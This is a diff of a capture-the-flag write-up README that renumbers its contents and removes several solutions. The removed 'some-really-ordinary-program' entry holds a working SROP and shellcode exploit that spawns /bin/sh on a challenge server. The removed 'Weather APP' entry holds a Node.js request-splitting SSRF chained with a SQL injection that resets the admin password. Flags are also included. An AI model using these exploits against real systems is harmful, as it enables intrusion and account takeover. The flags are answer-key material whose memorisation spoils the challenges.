@@ -13,32 +13,29 @@
 9. [Eighth Circle](#eighth-circle)
 10. [Henpeck](#henpeck)
 11. [Ret2basic](#ret2basic)
-12. [The List](#the-list)
-13. [Esab64](#esab64)
-14. [Resourceful](#resourceful)
-15. [Chicken Wings](#chicken-wings)
-16. [Andra](#andra)
-17. [Merch Store](#merch-store)
-18. [Bad Blog](#bad-blog)
-19. [Dice Roll](#dice-roll)
-20. [Microscopium](#microscopium)
-21. [Typewriter](#typewriter)
-22. [Some-really-ordinary-program](#some-really-ordinary-program)
-23. [Weather APP](#weather-app)
-24. [Eaxy](#eaxy)
-25. [Mission](#mission)
-26. [Bionic](#bionic)
-27. [Meet The Team](#meet-the-team)
-28. [Gus](#gus)
-29. [Hercules](#hercules)
-30. [Lyra](#lyra)
-31. [Orion](#orion)
-32. [Leo](#leo)
-33. [Hydraulic](#hydraulic)
-34. [Banking On It](#banking-on-it)
-35. [Internal](#internal)
-36. [Degrade](#degrade)
-37. [Centaurus](#centaurus)
+12. [Esab64](#esab64)
+13. [Resourceful](#resourceful)
+14. [Chicken Wings](#chicken-wings)
+15. [Andra](#andra)
+16. [Merch Store](#merch-store)
+17. [Bad Blog](#bad-blog)
+18. [Dice Roll](#dice-roll)
+19. [Microscopium](#microscopium)
+20. [Typewriter](#typewriter)
+21. [Eaxy](#eaxy)
+22. [Mission](#mission)
+23. [Bionic](#bionic)
+24. [Meet The Team](#meet-the-team)
+25. [Gus](#gus)
+26. [Hercules](#hercules)
+27. [Lyra](#lyra)
+28. [Orion](#orion)
+29. [Leo](#leo)
+30. [Hydraulic](#hydraulic)
+31. [Banking On It](#banking-on-it)
+32. [Internal](#internal)
+33. [Degrade](#degrade)
+34. [Centaurus](#centaurus)
 
 #### Rules Source Code
 <details><summary>Solution</summary>
@@ -195,12 +192,6 @@ r.interactive()
 ![image](https://user-images.githubusercontent.com/1076452/111002592-810ccc80-8364-11eb-9f58-0ca4bb807ed0.png)
 
 
-</details>
-
-#### The List
-<details><summary>Solution</summary>
-
-```flag{0eb219803dbfcda8620dae0772ae2d72}```
 </details>
 
 #### esab64
@@ -390,156 +381,6 @@ https://digital-forensics.sans.org/media/volatility-memory-forensics-cheat-sheet
 ```flag{c442f9ee67c7ab471bb5643a9346cf5e}```
 </details>
 
-#### some-really-ordinary-program
-<details><summary>Solution</summary>
-
-```
-#!/usr/bin/env python3
-from pwn import *
-import sys
-import subprocess
-
-context(terminal=['tmux', 'new-window'])
-context(os="linux", arch="amd64")
-
-p_name = "./some-really-ordinary-program"  ## change for the challenge name
-DEBUG = 0
-context.log_level = "debug"
-
-if DEBUG:
-    
-    p = process(p_name)         ## Start the new process
-    gdb_command = '''b * 0x401056'''.split('\n')    ## The command that will run gdb at startup
-    attach_command = "tmux new-window gdb {} {} ".format(p_name,p.pid)
-    for k in gdb_command:
-        attach_command += '''--eval-command="{}" '''.format(k)
-    log.debug("Starting a new gdb session with the following command: {}".format(attach_command))
-    subprocess.Popen(attach_command, shell=True, stdin=subprocess.PIPE)
-else:
-    p = remote("challenge.nahamcon.com", 32119)
-## everything goes here
-
-####    ADDRESSES  ####
-
-call_read = p64(0x401000)
-syscall_ret = p64(0x40100e)   #   syscall; ret
-sub_rsp = p64(0x401026)
-push_rbp = p64(0x401022)
-main = p64(0x401022)
-
-call_read_p3 = p64(0x401006)
-
-bss = 0x0000000000402000 
-####               ####
-####    FUNCTIONS  ####
-####               ####
-
-input("Send first payload ? ")
-
-frame_mprotect = SigreturnFrame()
-
-frame_mprotect.rax = 0xa
-frame_mprotect.rdi = 0x0000000000400000
-frame_mprotect.rsi = 0x1000
-frame_mprotect.rdx = 0x7
-frame_mprotect.rsp = 0x400088
-frame_mprotect.rip = u64(syscall_ret)
-
-# Make the bss writable and executable
-
-payload = b''
-payload += b'A' * 508
-payload += push_rbp
-#payload += call_read
-payload += syscall_ret
-payload += bytes(frame_mprotect)
-payload += b'B' * 8
-payload += b'C' * 8
-
-p.sendline(payload)
-
-input("Send second payload ? ")
-
-p.sendline(b'F' * (0xf-1) )
-
-input("Send third payload ? ")
-payload = b''
-payload += b'\x31\xc0\x50\x48\x31\xff\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x88\x00\x40\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05'
-
-'''
-rasm2 -b 64 'xor eax, eax 
-push eax
-xor rdi, rdi
-mov rax, 0x3b
-mov rdi, 0x400088
-xor rsi, rsi
-quote> xor rdx, rdx
-quote> syscall'
-'''
-
-payload += b'A' * (144 - len(payload) - len(b'/bin/sh\x00'))   #   Reach the place on the bss where the RSP is placed to overwrite the return address
-payload += b'/bin/sh\x00'
-payload += p64(0x400000) #   return to the shellcode, since we have the bss executable now
-p.sendline(payload)
-
-p.interactive()
-```
-```flag{175c051dbd3db6857f3e6d2907952c87}```
-</details>
-
-#### Weather APP
-<details><summary>Solution</summary>
-
-```
-#!/usr/bin/python3
-
-import requests
-import sys
-from requests.utils import requote_uri
-
-
-if len(sys.argv) != 2:
-    print(f"Usage: {sys.argv[0]} <url>")
-    exit(127)
-
-headers = {
-            "Host": "127.0.0.1"
-        }
-
-# problematic chars for nodejs 8.12 (https://jaeseokim.tistory.com/98)
-SPACE = "Ġ"
-CRLF = "čĊ"
-SLASH = "į"
-
-# base post data
-post_payload = "username={}&password=bruh"
-
-# sql payload to update admin pass
-payload = "admin','bruh') ON CONFLICT(username) DO UPDATE SET password='bruh'; --"
-
-# urlencoded sql payload
-sql_payload = requote_uri(payload)
-
-# insert payloads into base payloads and calc length
-user_payload = post_payload.format(sql_payload)
-l_payload = len(post_payload.format("")) + len(sql_payload)+10
-
-# payload sent to /api/weather/ endpoint
-base_payload = "127.0.0.1/test"+SPACE+"HTTP"+SLASH+"1.1"+CRLF+"HOST:"+SPACE+"127.0.0.1"+CRLF*2+"POST"+SPACE+SLASH+"register"+SPACE+"HTTP"+SLASH+"1.1"+CRLF+"HOST:"+SPACE+"127.0.0.1"+CRLF+"CONTENT-TYPE:"+SPACE+"application"+SLASH+"x-www-form-urlencoded"+CRLF+"CONTENT-LENGTH:"+SPACE+str(l_payload)+CRLF*2+user_payload+CRLF*2+"GET"+SPACE+SLASH+"aaa#"
-
-data = {"endpoint": base_payload,
-        "city": "bruh_city",
-        "country": "bruh country"
-        }
-
-# get url from cmdline arg
-url = sys.argv[1]
-
-res = requests.post(url, data, headers)
-print(res.text)
-```
-```HTB{w3lc0m3_t0_th3_p1p3_dr34m}```
-</details>
 
 #### Eaxy
 <details><summary>Solution</summary>
